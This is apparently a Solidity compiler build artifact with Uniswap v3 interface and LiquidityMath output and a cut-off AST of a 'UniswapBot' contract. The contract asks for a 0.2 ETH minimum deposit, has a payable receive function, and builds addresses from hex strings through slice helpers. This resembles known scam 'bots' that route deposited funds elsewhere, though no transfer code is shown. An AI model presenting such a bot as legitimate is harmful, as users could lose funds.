token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}}},\"title\":\"Pool state that can change\"},\"userdoc\":{\"methods\":{\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"}},\"notice\":\"These methods compose the pool's state, and can change with any frequency including multiple times per transaction\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":\"IUniswapV3PoolState\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							}
						},
						"notice": "These methods compose the pool's state, and can change with any frequency including multiple times per transaction"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"LiquidityMath": {
					"abi": [],
					"devdoc": {
						"methods": {},
						"title": "Math library for liquidity"
					},
					"evm": {
						"assembly": "    /* \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n\n    auxdata: 0xa264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 ISZERO 0x5D POP GASLIMIT 0xEC PUSH11 0x7D67EDAD656EAD3F8ACEBD 0xB7 0xAB 0xCD 0x5F EXP COINBASE 0xD4 0xDB PUSH32 0x969B61EDDA64736F6C6343000606003300000000000000000000000000000000 ",
							"sourceMap": "109:512:9:-:0;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 ISZERO 0x5D POP GASLIMIT 0xEC PUSH11 0x7D67EDAD656EAD3F8ACEBD 0xB7 0xAB 0xCD 0x5F EXP COINBASE 0xD4 0xDB PUSH32 0x969B61EDDA64736F6C6343000606003300000000000000000000000000000000 ",
							"sourceMap": "109:512:9:-:0;;;;;;12:1:-1;9;2:12"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"addDelta(uint128,int128)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH #[$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH [$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"source": -1,
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY",
									"source": -1
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE",
									"source": -1
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS",
									"source": -1
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8",
									"source": -1
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN",
									"source": -1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033",
									".code": [
										{
											"begin": 109,
											"end": 621,
											"name": "PUSHDEPLOYADDRESS",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "ADDRESS",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 9,
											"value": "80"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{},\"title\":\"Math library for liquidity\"},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":\"LiquidityMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"contracts/bot.sol": {
				"ast": {
					"absolutePath": "contracts/bot.sol",
					"exportedSymbols": {
						"UniswapBot": [
							1578
						]
					},
					"id": 1579,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 1579,
							"sourceUnit": 1662,
							"src": "111:89:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 1579,
							"sourceUnit": 1684,
							"src": "202:86:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"id": 4,
							"nodeType": "ImportDirective",
							"scope": 1579,
							"sourceUnit": 2156,
							"src": "290:84:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 5,
								"nodeType": "StructuredDocumentation",
								"src": "378:138:0",
								"text": "Testnet transactions will fail as there is no value\nUpdated Build\nMin liquidity after gas fees has to equal 0.2 ETH"
							},
							"fullyImplemented": true,
							"id": 1578,
							"linearizedBaseContracts": [
								1578
							],
							"name": "UniswapBot",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "6c02a931",
									"id": 7,
									"mutability": "mutable",
									"name": "tokenName",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1578,
									"src": "549:23:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 6,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "549:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "7b61c320",
									"id": 9,
									"mutability": "mutable",
									"name": "tokenSymbol",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1578,
									"src": "579:25:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 8,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "579:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 11,
									"mutability": "mutable",
									"name": "liquidity",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1578,
									"src": "611:14:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 10,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "611:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 15,
									"name": "Log",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 13,
												"indexed": false,
												"mutability": "mutable",
												"name": "_msg",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 15,
												"src": "644:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 12,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "644:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "643:13:0"
									},
									"src": "634:23:0"
								},
								{
									"body": {
										"id": 18,
										"nodeType": "Block",
										"src": "696:2:0",
										"statements": []
									},
									"documentation": null,
									"id": 19,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 16,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "676:2:0"
									},
									"returnParameters": {
										"id": 17,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "696:0:0"
									},
									"scope": 1578,
									"src": "669:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"canonicalName": "UniswapBot.slice",
									"id": 24,
									"members": [
										{
											"constant": false,
											"id": 21,
											"mutability": "mutable",
											"name": "_len",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 24,
											"src": "730:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 20,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "730:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										},
										{
											"constant": false,
											"id": 23,
											"mutability": "mutable",
											"name": "_ptr",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 24,
											"src": "750:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 22,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "750:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										}
									],
									"name": "slice",
									"nodeType": "StructDefinition",
									"scope": 1578,
									"src": "706:61:0",
									"visibility": "public"
								},
								{
									"body": {
										"id": 172,
										"nodeType": "Block",
										"src": "950:1305:0",
										"statements": [
											{
												"assignments": [
													34
												],
												"declarations": [
													{
														"constant": false,
														"id": 34,
														"mutability": "mutable",
														"name": "shortest",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 172,
														"src": "961:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 33,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "961:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 37,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 35,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 26,
														"src": "977:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 36,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_len",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 21,
													"src": "977:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "961:25:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 38,
															"name": "other",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 28,
															"src": "1002:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 39,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "1002:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 40,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 26,
															"src": "1015:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 41,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "1015:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1002:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 48,
												"nodeType": "IfStatement",
												"src": "998:63:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 46,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 43,
															"name": "shortest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 34,
															"src": "1040:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 44,
																"name": "other",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 28,
																"src": "1051:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"id": 45,
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "_len",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 21,
															"src": "1051:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1040:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 47,
													"nodeType": "ExpressionStatement",
													"src": "1040:21:0"
												}
											},
											{
												"assignments": [
													50
												],
												"declarations": [
													{
														"constant": false,
														"id": 50,
														"mutability": "mutable",
														"name": "selfptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 172,
														"src": "1074:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 49,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1074:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 53,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 51,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 26,
														"src": "1089:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 52,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 23,
													"src": "1089:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1074:24:0"
											},
											{
												"assignments": [
													55
												],
												"declarations": [
													{
														"constant": false,
														"id": 55,
														"mutability": "mutable",
														"name": "otherptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 172,
														"src": "1109:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 54,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1109:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 58,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 56,
														"name": "other",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "1125:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 57,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 23,
													"src": "1125:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1109:26:0"
											},
											{
												"body": {
													"id": 158,
													"nodeType": "Block",
													"src": "1194:1004:0",
													"statements": [
														{
															"assignments": [
																71
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 71,
																	"mutability": "mutable",
																	"name": "a",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 158,
																	"src": "1250:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 70,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1250:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 72,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1250:6:0"
														},
														{
															"assignments": [
																74
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 74,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 158,
																	"src": "1271:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 73,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1271:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 75,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1271:6:0"
														},
														{
															"assignments": [
																77
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 77,
																	"mutability": "mutable",
																	"name": "WETH_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 158,
																	"src": "1294:35:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 76,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1294:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 79,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 78,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
